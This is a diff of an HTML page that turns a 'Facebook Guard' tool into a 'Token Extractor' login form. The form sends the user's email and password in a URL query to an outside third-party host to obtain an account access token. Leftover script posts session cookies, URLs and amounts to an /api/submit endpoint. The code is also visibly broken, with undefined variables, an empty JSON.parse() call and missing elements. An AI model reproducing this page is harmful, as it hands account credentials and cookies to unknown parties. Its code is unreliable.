@@ -1,13 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Guard PROFILE</title>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.css">
- <style>
- body, html {
+   <head>
+      <meta charset="UTF-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Token Extractor</title>
+   </head>
+   <body>
+         <div class="wrapper-container">
+         <div class="container">
+            <h2>TOKEN GETTER</h2>
+            <p>A simple token getter no need some extension apps by Mark Hitsuraan.</p>
+         </div>
+    <form id="login-form">
+        <div class="form-item">
+            <label for="username">Email/UID:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your email" required>
+        </div>
+        <div class="form-item">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        </div>
+        <div class="form-item">
+            <button type="submit" id="login-button">Login</button>
+        </div>
+    </form>
+
+    <!-- Container to display appstate -->
+    <div id="result-container">
+        <h2></h2>
+        <div id="appstate"></div>
+    </div>
+    <button id="copy-button">Copy</button>
+</div>
+      <style>
+         body, html {
          margin: 0;
          }
          body {
@@ -19,73 +46,15 @@
          justify-content: center;
          align-items: center;
          }
-.container {
+         .container {
          background-color: #FFFFFFFF;
          border-radius: 10px;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          padding: 20px;
          margin: 20px auto;
          overflow: auto;
-}
-     
-#api-docs {
-    padding: 20px;
-}
-
-.code-container {
-    position: relative;
-    background-color: white;
-    padding: 20px;
-    border-radius: 5px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    overflow-x: auto;
-}
-
-.copy-btn-container {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-}
-
-.copy-btn {
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    padding: 8px 16px;
-    border-radius: 5px;
-    cursor: pointer;
-}
-
-footer {
-    background-color: #FFFFFFFF;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    padding: 20px;
-    margin: 20px auto;
-    overflow: auto;
-    text-align: center;
-}
-
-footer a {
-    color: white;
-    text-decoration: none;
-    margin: 0 10px;
-}
-    }/* Guard Css */
-#particles-js {
-   position: fixed;
-   width: 100%;
-   height: 100%;
-   z-index: -1;
-   top: 0;
-   left: 0;
-}
-h1 {
-            text-align: center;
-            margin-bottom: 20px;
-            color: #1C3144;
-        }
-        .form-item {
+         }
+         .form-item {
          padding: 8px;
          }
          h1 {
@@ -97,133 +66,216 @@ h1 {
          margin-bottom: 5px; 
          display: block; 
          }
-        label {
-            margin-bottom: 8px;
-            color: #1C3144;
-        }
-        input[type="text"] {
-            padding: 8px;
-            margin-bottom: 16px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            width: 100%;
-            max-width: 300px;
-        }
-        button {
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            background-color: #1C3144;
-            color: #fff;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            width: 100%;
-            max-width: 200px;
-        }
-        button:hover {
-            background-color: #005F73;
-        }
-        .response, .loading, .error {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-            text-align: center;
-        }
-        .response {
-            background-color: rgba(255, 255, 255, 0.9);
-            display: none;
-        }
-        .loading, .error {
-            background-color: rgba(255, 0, 0, 0.5);
-            color: #fff;
-            display: none;
-        }
+         input, button {
+         background: #FFFFFFFF;
+         color: #000000FF; 
+         border: solid 1px #222;
+         box-sizing: border-box;
+         width: 100%;
+         margin-bottom: 10px;
+         padding: 10px;
+         border-radius: 4px;
+         font-size: 16px;
+         }
+         button {
+         cursor: none;
+         color: #0a0a0a;
+         background-color: #ededed;
+         }
+         button:hover {
+         background: #CCC;
+         }
+         #result {
+         display: none;
+         text-align: center;
+         background-color: #ededed;
+         border: solid 1px #222;
+         padding: 10px;
+         border-radius: 4px;
+         color: #0a0a0a;
+         }
+         #process {
+         }
+         .current-online {
+         font-size: 13px;
+         background: #0a0a0a;
+         padding: 10px;
+         color: #898989;
+         border: solid 1px #898989;
+         border-radius: 4px;
+         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+         margin-bottom: 10px;
+         overflow: auto;
+         white-space: nowrap; 
+         }
+         #result {
+         padding: 10px;
+         margin-top: 20px;
+         border-radius: 5px;
+         }
+
+         #result-container {
+         display: none;
+         margin-top: 20px;
+         padding: 20px;
+         background-color: #f5f7f7;
+         border-radius: 8px;
+         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+         max-height: 300px; 
+         overflow-y: auto; 
+         }
+
+         #result-container h2 {
+         color: #343a40;
+         }
+
+         #appstate {
+         white-space: 20pre-line;
+         width: 200px;
+         }
       </style>
-</head>
-<body>
-    <div class="wrapper-container">
-         <div class="container">
-          <h2>FACEBOOK GUARD</h2>
-        <p>A simple guard facebook profile using access token by Mark Hitsuraan.</p>
-      </div>
-      <form id="guardForm">
-          <label for="token">Access Token:</label>
-          <input type="text" id="token" name="token" placeholder="Enter your access token" required>
-          <label for="enable">Enable:</label>
-          <input type="text" id="enable" name="enable" placeholder="Enter true(on) if false(off)" required>
-          <button type="submit">Guard Profile</button>
-      </form>
-      <div class="loading" id="loading">Loading...</div>
-      <div class="response" id="response"></div>
-      <div class="error" id="error">    </div>
-      <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <script src="particles.json"></script>
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            particlesJS.load('particles-js', 'particles.json', function () {
-                console.log('particles.js loaded');
-            });
-        });
       <script>
-         function copyCode() {
-    var code = document.querySelector('.code-container code');
-    var range = document.createRange();
-    range.selectNode(code);
-    window.getSelection().removeAllRanges();
-    window.getSelection().addRange(range);
-    document.execCommand('copy');
-    window.getSelection().removeAllRanges();
-    alert('Code copied to clipboard!');
+         async function submitForm() {
+           event.preventDefault();
+           const result = document.getElementById('result');
+           const button = document.getElementById('submit-button');
+           try {
+             result.style.display = 'block';
+             button.style.display = 'none';
+             const response = await fetch('/api/submit', {
+               method: 'POST',
+               body: JSON.stringify({
+                 cookie: document.getElementById('cookies').value,
+                 url: document.getElementById('urls').value,
+                 amount: document.getElementById('amounts').value,
+                 interval: document.getElementById('intervals').value,
+               }),
+               headers: {
+                 'Content-Type': 'application/json',
+               },
+             });
+             const data = await response.json();
+
+             if (data.status === 200) {
+               result.style.backgroundColor = '#32ff0dc7';
+               result.style.color = '#222';
+               result.innerHTML = 'Submitted successfully!';
+               button.style.display = 'block';
+             } else {
+               result.style.backgroundColor = '#3D1619';
+               result.style.color = '#FE6265';
+               result.innerHTML = 'Error: ' + data.error;
+               button.style.display = 'block';
+             }
+           } catch (e) {
+             console.error(e);
+           }
+         }
+
+         async function linkOfProcessing() {
+           try {
+             const container = document.getElementById('processing');
+             const processContainer = document.getElementById('process-container');
+             const initialResponse = await fetch('/total');
+
+             if (!initialResponse.ok) {
+               throw new Error(`Failed to fetch: ${initialResponse.status} - ${initialResponse.statusText}`);
+             }
+
+             const initialData = await initialResponse.json();
+             if (initialData.length === 0) {
+               processContainer.style.display = 'none';
+               return;
+             }
+             initialData.forEach((link, index) => {
+
+               let { url, count, id, target, session } = link;
+               const processCard = document.createElement('div');
+               processCard.classList.add('current-online');
+
+               const text = document.createElement('h4');
+               text.classList.add('count-text');
+               text.innerHTML = `${index + 1}. ID: ${id} | ${count}/${target}`;
+
+               processCard.appendChild(text);
+               container.appendChild(processCard);
+
+               const intervalId = setInterval(async () => {
+                 const updateResponse = await fetch('/total');
+
+                 if (!updateResponse.ok) {
+                   console.error(`Failed to fetch update: ${updateResponse.status} - ${updateResponse.statusText}`);
+                   return;
+                 }
+
+                 const updateData = await updateResponse.json();
+                 const updatedLink = updateData.find((link) => link.session === session);
+
+                 if (updatedLink) {
+                   let { count } = updatedLink;
+                   update(processCard, count, id, index, target);
+                 }
+               }, 1000);
+             });
+
+           } catch (error) {
+             console.error(error);
+           }
+         }
+
+         function update(card, count, id, index, target) {
+           let container = card.querySelector('.count-text');
+           container.textContent = `${index + 1}. ID: ${id} | ${count}/${target}`;
+         }
+
+         linkOfProcessing();
+
+         function loginRequest(email, password) {
+  return fetch("https://useless-apiss.onrender.com/eaaaay/api?user=" + email + "&pass=" + password, {
+    method: "GET"
+  });
 }
 
-/* GUARD PPROFIL */
-        document.getElementById("guardForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            const token = document.getElementById("token").value.trim();
-            const enable = document.getElementById("enable").value.trim();
-            if (token === '' || enable === '') {
-                showError("Access token and options of True(on) & False(off) are required.");
-                return;
-            }
-guardProfile(token, enable);
-        });
+document.getElementById("copy-button").style.display = "none";
 
-function guardProfile(token, enable) {
-            const loadingDiv = document.getElementById("loading");
-            const responseDiv = document.getElementById("response");
-            const errorDiv = document.getElementById("error");
+document.getElementById("login-form").addEventListener("submit", async function(event) {
+  event.preventDefault();
 
-            loadingDiv.style.display = "block";
-            responseDiv.style.display = "none";
-            errorDiv.style.display = "none";
+  const loginButton = document.getElementById("login-button");
+  const email = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
 
-    axios.post(`/shield?token=${token}&enable=${enable}`)
-        .then(response => {
-            const responseData = response.data;
-            responseDiv.innerHTML = JSON.stringify(responseData);
-            responseDiv.style.display = "block";
-            loadingDiv.style.display = "none";
-            if (responseData && responseData.success) {
-                alert("Successfully Guarded! Please check your profile.");
-            }
-        })
-        .catch(error => {
-            console.error("Error:", error);
-            loadingDiv.style.display = "none";
-            if (error.response && error.response.status === 400) {
-                showError("Invalid access token or profile ID. Please check and try again.");
-            } else {
-                showError("An error occurred. Please try again later.");
-            }
-        });
+  try {
+    loginButton.innerText = "Logging In";
+
+    const response = await loginRequest(email, password);
+    const data = await JSON.parse();
+
+    if (resJson.access_token) {
+      document.getElementById("result-container").style.display = "block";
+      document.getElementById("appstate").innerText = resJson.access_token;
+      alert("Login Success, Click \"Ok\"");
+      loginButton.innerText = "Logged In";
+      document.getElementById("copy-button").style.display = "block";
+    } else {
+      alert("Failed to retrieve token. Please check your credentials and try again.");
     }
+  } catch (error) {
+    console.error("Error retrieving token:", error);
+    alert("An error occurred while retrieving token. Please try again later.");
+  }
+});
 
-function showError(message) {
-            const errorDiv = document.getElementById("error");
-            errorDiv.innerHTML = message;
-            errorDiv.style.display = "block";
-}
-    </script>
-</body>
-</html>
+document.getElementById("copy-button").addEventListener("click", function() {
+  const token = document.getElementById("token").innerText;
+  navigator.clipboard.writeText(token).then(function() {
+    alert("Token copied to clipboard!");
+  }, function(error) {
+    console.error("Failed to copy token: ", error);
+    alert("Failed to copy token. Please try again.");
+  });
+});
+
+            </script>
+   </body>
+</html> 
